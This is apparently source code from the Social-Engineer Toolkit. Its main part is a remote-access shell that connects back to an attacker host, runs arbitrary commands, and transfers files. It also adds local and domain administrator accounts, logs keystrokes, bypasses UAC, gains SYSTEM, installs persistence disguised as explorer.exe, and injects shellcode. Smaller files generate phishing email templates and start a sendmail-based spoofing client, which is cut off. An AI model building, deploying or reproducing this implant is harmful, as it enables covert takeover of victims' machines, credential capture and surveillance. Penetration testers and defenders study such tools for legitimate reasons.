# Changing the 64bit thing will fix it completely.
#
# You will also need to edit Build.py, search for return '64bit' and change to return '32bit'.
# Another bug for detection.
#
# Then create a bash script and run the below from the command line:
#
# export VERSIONER_PYTHON_PREFER_32_BIT=yes
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell/shell.spec
#
#
# This will allow you to compile the shell via pyinstaller for OSX
#
# On LINUX it's easy just use pyinstaller ensure paramiko is installed
#
###################################################################################################################
#
#
###################################################################################################################
#
# download pyinstaller from: http://www.pyinstaller.org/
#
# Make sure your using python2.5, anything above gets buggy.
#
# Make sure you have win32api, paramiko, pycrypto python modules installed
#
# Ensure to install pyinstaller 1.4, 1.5 is buggy.
#
# Unzip: and run the following commands on the shell.py file
#
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell\shell.spec
#
###################################################################################################################

verbose = True

# random value here to randomize builds
a = 50 * 5

# try block here
try:
    # check for an ip address file if we aren't feeding it
    temp = tempfile.gettempdir() # prints the current temporary directory
    if os.path.isfile(temp + "/42logfile42.tmp"):
        fileopen = file(temp + "/42logfile42.tmp", "r")
        data = fileopen.read()
        data = data.split(" ")
        ipaddr = data[0]
        port = data[1]
        try: os.remove(temp + "/42logfile42.tmp")
        except: pass
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)
        # parse the textfile
        sockobj.connect((ipaddr, int(port)))

    if not os.path.isfile(temp + "/42logfile42.tmp"):
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)
        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

# except index error which means user didn't specify IP and port
except IndexError:
    # send error message
    #if verbose == True:
    print "\nThe Social-Engineer Toolkit Basic Shell\n\nSyntax: shell.exe <ipaddress> <port>"
    # exit the program
    sys.exit()

# except Exception
except Exception, e:
    if verbose == True: print e

    # sleep 10 seconds and try to connect again
    try:
        time.sleep(10)
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)

        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

        # wait 10 more and try again
        time.sleep(10)

        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)

        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

    # if not give up
    except Exception, e:
        if verbose == True: print e
        sys.exit()

# tell SET we are the interactive shell
# if we're nix
if operating_system == "windows":
    send_string = "IHAYYYYYIAMSETANDIAMWINDOWS"
# if we're nix
if operating_system == "posix":
    send_string = "IHAYYYYYIAMSETANDIAMPOSIXXX"
sockobj.send(send_string)

# generate random strings
def generate_random_string(low,high):
    length=random.randint(low,high)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    return rand_gen

# this is what we use to either encrypt or not encrypt
def send_packet(message, sockobj, encryption, cipher):

    # if we encrypt or not
    if encryption == 1:

        # we encrypt our output here
        encoded = EncodeAES(cipher, message)
        # we take the length of the encrypted string
        normal_size = len(encoded)
        # we turn the length of our string into a string literal
        normal_size = str(normal_size)
        # we encrypt our string literal
        normal_size_crypt= EncodeAES(cipher, normal_size)
        # we send our encrypted string literal to let our server know how long our
        # true encrypted string is
        sockobj.sendall(normal_size_crypt)
        # we send our encrypted string
        time.sleep(0.5)
        sockobj.sendall(encoded)

    # if 0 then don't encrypt
    if encryption == 0:
        normal_size = str(len(message))
        message = str(message)
        sockobj.send(normal_size)
        sockobj.send(str(message))

# decrypt packet routine
def decrypt_packet(message, encryption, cipher):

    # if we support encryption
    if encryption == 1:
        return DecodeAES(cipher, message)

    # if we don't support encryption
    if encryption == 0:

        return message

# receive file from the attacker machine
def upload_file(filename):

    # define data as a received information from attacker machine
    data=sockobj.recv(1024)

    # decrypt the packet which will tell us length to be sent
    data=decrypt_packet(data, encryption, cipher)

    # this will be our encrypted filepath
    data = sockobj.recv(1024)

    # decrypted file path, not needed here
    data = decrypt_packet(data, encryption, cipher)

    # specify file to write
    filewrite=file(filename, "wb")

    # this will be our length for our file
    data = sockobj.recv(1024)

    # decrypt the length of our file
    data = decrypt_packet(data, encryption, cipher)

    # here is an ugly hack but it works, basically we set two
    # counters. MSGLEN which will eventually equal the length
    # of what number was sent to us which represented the length
    # of the output of the shell command we executed. Dataout
    # will eventually equal the entire string loaded into our
    # buffer then sent for decryption.
    #
    # A loop is started which continues to receive until we hit
    # the length of what our entire full encrypted shell output
    # is equaled. Once that occurs, we are out of our loop and
    # the full string is sent to the decryption routine and
    # presented back to us.

    MSGLEN = 0
    dataout = ""
    length = int(data)
    while MSGLEN != length:
        data = sockobj.recv(1024)
        dataout += data
        MSGLEN = MSGLEN + len(data)

    data = decrypt_packet(dataout, encryption, cipher)
    filewrite.write(data)

    # close file after write
    filewrite.close()

    # confirm its there
    if os.path.isfile(filename):
        send_packet("Confirmed", sockobj, encryption, cipher)

    # if its not then send back failed
    if not os.path.isfile(filename):
        send_packet("Failed", sockobj, encryption, cipher)

# Note that this module does not come with pre-build binaries you will need either a compiler installed
# on your Windows machine or download the binary blobs from here:
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

from Crypto.Cipher import AES

# set encryption key to 1
encryption = 1

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# random value here to randomize builds
a = 50 * 5

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#############################################
#
#     Reboot Server Code through Native
#     API.
#
#############################################

def AdjustPrivilege(priv, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    # Get the ID for the system shutdown privilege.
    idd = win32security.LookupPrivilegeValue(None, priv)
    # Now obtain the privilege for this process.
    # Create a list of the privileges to be added.
    if enable:
        newPrivileges = [(idd, SE_PRIVILEGE_ENABLED)]
    else:
        newPrivileges = [(idd, 0)]
    # and make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, newPrivileges)

def RebootServer(message='Rebooting', timeout=0, bForce=0, bReboot=1):
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.InitiateSystemShutdown(None, message, timeout, bForce, bReboot)
    finally:
        # Now we remove the privilege we just added.
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)

def AbortReboot():
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.AbortSystemShotdown(None)
    finally:
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)


########################################
#
#     Start Paramiko Code here
#
########################################

def handler(chan, host, port):
    sock = socket()
    try:
        sock.connect((host, port))

    except Exception, e:
        if verbose == True: print e
        return

    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()

# here is where we start the transport request for port forward on victim then tunnel over via thread and handler
def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):

    transport.request_port_forward('', server_port)
    # while we accept transport via thread handler continue loop
    while True:
        chan = transport.accept(1000)
        if chan is None:
            continue
        # define thread
        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
        # set thread as daemon
        thr.setDaemon(True)
        # start thread
        thr.start()

########################################
#
#   End Paramiko Code here
#
########################################

# main outside loop for the shell
try:

    while 1:

    # second inside loop
        while 1:

        # receive socket connection from attacker
            data = sockobj.recv(1024)

            if data == "quit" or data == "":
                sys.exit()

            # if the length is 52 then we support encryption
            if len(data) == 52:
                encryption=1
                sockobj.send(data)
                data = sockobj.recv(1024)
                data = binascii.unhexlify(data)
                secret = data
                cipher = AES.new(secret)
                break

            # if the length is 51 then we don't support encryption
            if len(data) == 51:
                # if we don't support encryption then break out
                cipher = ""
                sockobj.send(data)
                encryption=0
                break

        # while true loop forever
        while 1:

            # define data as a received information from attacker machine
            data=sockobj.recv(1024)

            # decrypt the packet which will tell us length to be sent
            data=decrypt_packet(data, encryption, cipher)

            # leverage the previous data socket connection as our length for our next socket
            data=sockobj.recv(int(data))

            # this will be our actual data packet
            data=decrypt_packet(data, encryption, cipher)

            # if data == quit or exit break out of main loop and renegotiate encryption
            if data == "quit" or data == "exit": break

            # if the attacker specifies a command shell lets get it ready
            if data == "shell":
                # specify another while loop to put us into the subprocess commands
                while 1:

                    # try block
                    try:

                        # define data as a received information from attacker machine
                        data=sockobj.recv(1024)

                        # decrypt the packet which will tell us length to be sent
                        data=decrypt_packet(data, encryption, cipher)

                        # leverage the previous data socket connection as our length for our next socket
                        data=sockobj.recv(int(data))

                        # this will be our actual data packet
                        data=decrypt_packet(data, encryption, cipher)
                        # if we receive data 'exit' then break out of the loop but keep socket alive
                        if data == "exit" or data == "quit":
                            data=""
                            # break out of the loop
                            break

                        # note that you have to do some funky stuff with stdout, stderr, and stdin,
                        # when you use a non-console window subprocess bugs out (known since python
                        # 2.5.1). You need to pipe all the channels out to subprocess.PIPE then
                        # communicate with only stdout via proc.stdout.read() if not you will get a
                        # major error when running the shell.

                        # send our command that would be 'data'
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # communicate with stdout and send it back to attacker
                        stdout_value = proc.stdout.read()

                        # if we have an error just append to nothing if needed
                        stdout_value += proc.stderr.read()

                        # do the actual send
                        send_packet(str(stdout_value) + "\r\n", sockobj, encryption, cipher)

                    # except a keyboard interrupt shouldn't actually hit this since we are using commands from attacker
                    except KeyboardInterrupt:

                        # close socket
                        sockobj.close()

                        # exit
                        sys.exit()

                    # except all other errors
                    except Exception, e:
                        if verbose == True: print e
                        # pass through them
                        pass

            # this section adds a local admin on the local system
            if data == "localadmin":
                try:

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our length for our next socket
                    data=sockobj.recv(int(data))

                    # this will be our actual data packet
                    data=decrypt_packet(data, encryption, cipher)

                    # split the data sent, should be seperated by a command "," which splits into a tuple
                    data = data.split(",")

                    # this initiates subprocess.Popen as a shell command and uses net user to add a local user account initally locally
                    proc=subprocess.Popen("net user %s %s /ADD" % (data[0],data[1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                    # this initiates subprocess.Popen as a shell command and uses net localgroup to add a local administrator
                    proc=subprocess.Popen("net localgroup administrators %s /ADD" % (data[0]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                # except exception
                except Exception, e:
                    if verbose == True: print e
                    pass


            # this section adds a domain admin on the local system
            if data == "domainadmin":
                try:

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our length for our next socket
                    data=sockobj.recv(int(data))

                    # this will be our actual data packet
                    data=decrypt_packet(data, encryption, cipher)

                    # split the data sent, should be seperated by a command "," which splits into a tuple
                    data = data.split(",")

                    # this initiates subprocess.Popen as a shell command and uses net user to add a domain user account initially
                    proc=subprocess.Popen("net user %s %s /ADD /DOMAIN" % (data[0], data[1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                    # this initiates subprocess.Popen as a shell command and uses net group to add to domain admins
                    proc=subprocess.Popen('net group "Domain Admins" %s /ADD /DOMAIN' % (data[0]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                # except errors and don't pass them yet, will add to logging later
                except Exception, e:
                    if verbose == True: print e
                    pass


            # this section is if the attacker wants to download a file
            if data == "downloadfile":
                try:

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our length for our next socket
                    #data=sockobj.recv(int(data))

                    data = sockobj.recv(1024)

                    # this will be our actual data packet
                    download=decrypt_packet(data, encryption, cipher)

                    # if the file isn't there let the listener know
                    if not os.path.isfile(download):
                        # send that the file isn't found
                        send_packet("File not found.", sockobj, encryption, cipher)

                    # if the file is there then cycle through it and let the listener know
                    if os.path.isfile(download):
                        # open the file for read/binary
                        fileopen=file(download, "rb")
                        data_file=""
                        # while data send socket per line
                        for data in fileopen:
                            data_file += data
                        send_packet(data_file, sockobj, encryption, cipher)

                # except exception
                except Exception, e:
                    if verbose == True: print e
                    pass

            # this section is if the attacker wants to upload a file
            if data == "uploadfile":
                # try block
                try:

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # this will be our encrypted filepath
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    upload_path = data

                    # specify file to write
                    filewrite=file(upload_path, "wb")

                    # this will be our length for our file
                    data = sockobj.recv(1024)

                    # decrypt the length of our file
                    data = decrypt_packet(data, encryption, cipher)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the shell command we executed. Dataout
                    # will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted shell output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = sockobj.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption, cipher)
                    filewrite.write(data)

                    # close file after write
                    filewrite.close()

                    # confirm its there
                    if os.path.isfile(upload_path):
                        send_packet("Confirmed", sockobj, encryption, cipher)

                    # if its not then send back failed
                    if not os.path.isfile(upload_path):
                        send_packet("Failed", sockobj, encryption, cipher)

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

            # here is where we start our paramiko SSH tunneling
            if data == "paramiko":

                # start initial try block
                try:
                    # send to the server that we support paramiko
                    send_packet("Paramiko Confirmed.", sockobj, encryption, cipher)

                    # receive all of our variables to establish tunnel
                    data = sockobj.recv(1024)
                    # decrypt the packet
                    data = decrypt_packet(data, encryption, cipher)

                    # receive all
                    data = sockobj.recv(int(data))
                    data = decrypt_packet(data, encryption, cipher)

                    # split into a tuple
                    data = data.split(",")

                    # IP of the SSH server
                    ssh_server_ip = data[0]
                    # PORT of the SSH server
                    ssh_server_port_address = data[1]
                    # PORT to use on localhost for tunneled protcol
                    ssh_server_tunnel_port = data[2]
                    # username for SSH server
                    ssh_server_username = data[3]
                    # password for SSH server
                    ssh_server_password = data[4]
                    # PORT to forward from victim
                    victim_server_port = data[5]
                    # specify data as ssh_port_tunnel

                    # main class here
                    def main(garbage_one,garbage_two,garbage_three):
                        server = [ssh_server_ip, int(ssh_server_port_address)]  # our ssh server
                        remote = ['127.0.0.1', int(victim_server_port)] # what we want to tunnel
                        password = ssh_server_password # our password
                        client = paramiko.SSHClient() # use the paramiko SSHClient
                        client.load_system_host_keys() # load SSH keys
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key

                        try:
                            client.connect(server[0], server[1], username=ssh_server_username, key_filename=None, look_for_keys=False, password=password)

                        # except exception
                        except Exception, e:
                            if verbose == True: print '*** Failed to connect to %s:%d: %r' % (server[0], server[1], e)
                        try:
                            reverse_forward_tunnel(ssh_server_tunnel_port, remote[0], remote[1], client.get_transport())

                        # except exception
                        except Exception, e:
                            if verbose == True: print e

                    # have to pass some garbage to start thread
                    garbage_one = ""
                    garbage_two = ""
                    garbage_three = ""

                    # start a new thread to ensure that when we establish an SSH tunnel we can continue
                    # to leverage SET interactive shell.
                    # this starts the main routine which is where we get all our port forward stuff
                    thread.start_new_thread(main,(garbage_one,garbage_two,garbage_three))

                # except exception
                except Exception, e:
                    if verbose == True: print e

            # lock the workstation of victim
            if data == "lockworkstation":
                ctypes.windll.user32.LockWorkStation ()


            # elevate permissions
            if data == "getsystem":
                try:
                    temp_path = os.getenv('TEMP')

                    # this is our shell exectuable
                    set_payload = temp_path + "\\" + generate_random_string(10,15) + ".exe"

                    # accept the file and write it do disk as the set_payload variable
                    upload_file(set_payload)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # this will spawn the shell in a seperate process thread as SYSTEM
                    def getsystem(set_payload, ipaddr):
                        # generate a random string between 10 and 15 length
                        service_name = generate_random_string(10,15)
                        # create a service
                        subprocess.Popen('sc create %s binpath= "cmd /c %s %s" type= own' % (service_name, set_payload,ipaddr), shell=True).wait()

                        # start the service, don't wait for it to finish
                        subprocess.Popen("sc start %s" % (service_name), shell=True)

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data

                    #
                    # start a new thread
                    #
                    thread.start_new_thread(getsystem,(set_payload,ipaddr))

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

            # keystroke logging
            if data == "keystroke_start":

                # TEMP directory
                temp_path = os.getenv('TEMP')

                # this is the log file
                global logfile
                logfile = temp_path + "\\" + generate_random_string(10,15)

                # trigger an event
                def OnKeyboardEvent(event):

                    filewrite = file(logfile, "a")
                    filewrite.write(chr(event.Ascii))
                    filewrite.close()
                    return True

                # start keystroke logging
                def start_keystroke(garbage1,garbage2,garbage3):

                    hm = pyHook.HookManager()
                    hm.KeyDown = OnKeyboardEvent
                    hm.HookKeyboard()
                    pythoncom.PumpMessages()

                # need to pass vars to meet threading requirements
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""

                # start the keystroke logger
                thread.start_new_thread(start_keystroke,(garbage1,garbage2,garbage3))

            # dump keystrokes
            if data == "keystroke_dump":

                # set a flag to test if we ran keystroke_start first
                flag = 0
                # try to see if logfile is there
                try: logfile
                except: flag = 1

                # if we are all set
                if flag == 0:

                    # open the logfile
                    if os.path.isfile(logfile):
                        fileopen = file(logfile, "r")

                        # read all the data
                        data = fileopen.read()

                        # if we found nothing yet
                        if data == "":
                            data = "[!] There is no captured keystrokes yet."

                    if not os.path.isfile(logfile):
                        data = "[!] There is no captured keystrokes yet."

                    send_packet(data, sockobj, encryption, cipher)

                # if we didn't start the keystroke
                if flag == 1:
                    send_packet("[!] It doesn't appear keystroke_start is running, did you execute the command?", sockobj, encryption, cipher)

            # bypass windows uac
            if data == "bypassuac":
                # try block
                try:

                    # TEMP directory
                    temp_path = os.getenv('TEMP')

                    # this is our bypass uac executable
                    bypassuac = temp_path + "\\" + generate_random_string(10,15) + ".exe"

                    # this is our actual SET payload to be executed with UAC safe stuff
                    set_payload = temp_path + "\\" + generate_random_string(10,15) + ".exe"

                    # upload our files first is bypass uac
                    upload_file(bypassuac)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # set payload
                    upload_file(set_payload)

                    # this will spawn the shell in a seperate process thread
                    def launch_uac(bypassuac, set_payload, ipaddress):
                        subprocess.Popen("%s /c %s %s" % (bypassuac, set_payload,ipaddress), shell=True).wait()

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data

                    #
                    # start a new thread
                    #
                    thread.start_new_thread(launch_uac,(bypassuac,set_payload,ipaddr))

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

            # remov for SET
            if data == "removepersistence":
                # try block
                try:
                    # WINDIR directory
                    windir_path = os.getenv('WINDIR')
                    # this is our SET interactive service executable
                    # set_service = windir_path + "\\system32\\" + generate_random_string(10,15) + ".exe"
                    set_service = windir_path + "\\system32\\" + "explorer.exe"
                    subprocess.Popen("%s stop" % (set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    subprocess.Popen("%s remove" % (set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

            # persistence for SET
            if data == "persistence":
                # try block
                try:

                    # WINDIR directory
                    windir_path = os.getenv('WINDIR')

                    # enumerate home directory
                    homedir_path = os.getenv("SystemDrive")
                    homedir_path = homedir_path + "\\Program Files\\Common Files\\"

                    # see if we are running vista/windows 7 (potential for UAC)
                    os_counter = 0

                    # see if its vista or windows 7
                    if os.path.isdir(homedir_path):
                        os_counter = 1
                        set_service = homedir_path + "explorer.exe"
                        set_shell = homedir_path + generate_random_string(10,15) + ".exe"

                    # this is our SET interactive service executable
                    # if its at system32
                    if os_counter == 0:
                        if os.path.isdir("%s\\system32" % (windir_path)):
                            set_service = windir_path + "\\system32\\" + "explorer.exe"

                            # this is the SET interactive shell
                            set_shell = windir_path + "\\system32\\" + generate_random_string(10,15) + ".exe"

                    # upload the persistence set interactive shell
                    upload_file(set_service)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # upload our SET interactive service
                    upload_file(set_shell)

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data
                    #ipaddr = set_shell + " " + ipaddr
                    if os_counter == 0:
                        filewrite=file("%s\\system32\\isjxwqjs" % (windir_path), "w")
                    if os_counter == 1:
                        filewrite=file("%sisjxwqjs" % (homedir_path), "w")
                    filewrite.write('"'+set_shell+'"'+ " " + ipaddr)
                    filewrite.close()
                    time.sleep(2)
                    # automatically start service
                    subprocess.Popen('"%s" --startup auto install' % (set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    time.sleep(5)
                    # start the service
                    subprocess.Popen('"%s" start' % (set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

            # if the attacker specifies a command shell lets get it ready
            if data == "ps":
                try:
                    # if we're running windows then use win32process to enumerate
                    if operating_system == "windows":
                        processes = win32process.EnumProcesses()
                        data = ""
                        for pid in processes:
                            try:
                                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
                                exe = win32process.GetModuleFileNameEx(handle, 0)
                                data+=exe + " PID:" + str(pid) + "\r\n"
                            except: pass

                    # if we're running linux then run subprocess ps -aux to enumerate
                    if operating_system == "posix":

                        # send our command that would be 'data'
                        proc = subprocess.Popen("ps -ax", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # communicate with stdout and send it back to attacker
                        stdout_value = proc.stdout.read()

                        # if we have an error just append to nothing if needed
                        stdout_value += proc.stderr.read()

                        # send the data back
                        data = stdout_value

                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                except Exception, e:
                    if verbose == True: print e

            # if we want to kill a process
            if data == "kill":
                try:
                    # recv initial length of next socket
                    data = sockobj.recv(1024)
                    data=decrypt_packet(data,encryption,cipher)
                    # this should be our pid to kill
                    data = sockobj.recv(int(data))
                    pid = decrypt_packet(data,encryption,cipher)

                    # if we're running windows then use win32api to kill and terminate process
                    if operating_system == "windows":
                        # specify handler as the process id received
                        handler = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0,int(pid))
                        # kill the process through the win32api TerminatorProcess function call
                        win32api.TerminateProcess(handler,0)

                    # if we're running linux then run kill -9
                    if operating_system == "posix":
                        subprocess.Popen("kill -9 %s" % (pid), shell=True)

                    data = "Confirmed kill"
                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                # except exception
                except Exception, e:
                    if verbose == True: print e
                    sys.exit()

            # this is for rebooting the server
            if data == "reboot":
                try:
                    # if we're running windows then use win32process to enumerate
                    if operating_system == "windows":
                        RebootServer()
                        data = "[*] Server has been rebooted."

                    # if we're running linux then run subprocess ps -aux to enumerate
                    if operating_system == "posix":

                        # send our command that would be 'data'
                        proc = subprocess.Popen("reboot now", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # send the data back
                        data = "[*] Server has been rebooted."

                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                except Exception, e:
                    if verbose == True: print e

            # this section is if the attacker wants to upload a file
            if data == "shellcode":
                # try block
                try:

                    # define data as a received information from attacker machine
                    data=sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data=decrypt_packet(data, encryption, cipher)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the shell command we executed. Dataout
                    # will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted shell output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = sockobj.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption, cipher)

                    shellcode = bytearray("%s" % (data))

                    # awesome shellcode injection code http://www.debasish.in/2012/04/execute-shellcode-using-python.html
                    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                              ctypes.c_int(len(shellcode)),
                                                              ctypes.c_int(0x3000),
                                                              ctypes.c_int(0x40))

                    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                                       ctypes.c_int(len(shellcode)))

                    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

                    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                                         buf,
                                                        ctypes.c_int(len(shellcode)))

                    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                             ctypes.c_int(0),
                                                             ctypes.c_int(ptr),
                                                             ctypes.c_int(0),
                                                             ctypes.c_int(0),
                                                             ctypes.pointer(ctypes.c_int(0)))

                    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

                # handle error messages
                except Exception, e:
                    if verbose == True: print e
                    pass

# keyboard interrupts here
except KeyboardInterrupt:
    if verbose == True: print "[!] KeyboardInterrupt detected. Bombing out of the interactive shell."

# handle exceptions
except Exception, e:
    if verbose == True: print e
    sys.exit()

########NEW FILE########
__FILENAME__ = custom_template
#!/usr/bin/env python
import random
from src.core import setcore as core

try:
    print ("\n         [****]  Custom Template Generator [****]\n")
    print ("\n   Always looking for new templates! In the set/src/templates directory send an email\nto davek@secmaniac.com if you got a good template!")
    author=raw_input(core.setprompt("0", "Name of the author"))
    filename=randomgen=random.randrange(1,99999999999999999999)
    filename=str(filename)+(".template")
    subject=raw_input(core.setprompt("0", "Email Subject"))
    try:
        body=raw_input(core.setprompt("0", "Message Body, hit return for a new line. Control+c when you are finished"))
        while body != 'sdfsdfihdsfsodhdsofh':
            try:
                body+=(r"\n")
                body+=raw_input("Next line of the body: ")
            except KeyboardInterrupt: break
    except KeyboardInterrupt: pass
    filewrite=file("src/templates/%s" % (filename), "w")
    filewrite.write("# Author: "+author+"\n#\n#\n#\n")
    filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
    filewrite.write('BODY='+'"'+body+'"\n')
    print "\n"
    filewrite.close()
except Exception, e:
    print "   An error occured, printing error message: "+str(e)

########NEW FILE########
__FILENAME__ = smtp_client
#!/usr/bin/env python
# for client emails
import smtplib
import os
import getpass
import sys
import subprocess
import re
import glob
import random
import pexpect
import base64
import thread

from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
# DEFINE SENDMAIL CONFIG
sendmail=0
sendmail_file=file("config/set_config","r").readlines()

from src.core.setcore import *

# Specify if its plain or html
message_flag="plain"

for line in sendmail_file:
    # strip carriage returns
    line=line.rstrip()
    match=re.search("SENDMAIL=",line)
    if match:
        # if match and if line is flipped on continue on
        if line == ("SENDMAIL=ON"):
            print_info("Sendmail is a Linux based SMTP Server, this can be used to spoof email addresses.")
            print_info("Sendmail can take up to three minutes to start FYI.")
            print_status("Sendmail is set to ON")
            sendmail_choice = yesno_prompt(["1"], "Start Sendmail? [yes|no]")
            # if yes, then do some good stuff
            if sendmail_choice == "YES":
                print_info("NOTE: Sendmail can take 3-5 minutes to start.")
                if os.path.isfile("/etc/init.d/sendmail"):
                    subprocess.Popen("/etc/init.d/sendmail start", shell=True).wait()
                # if not there then prompt user
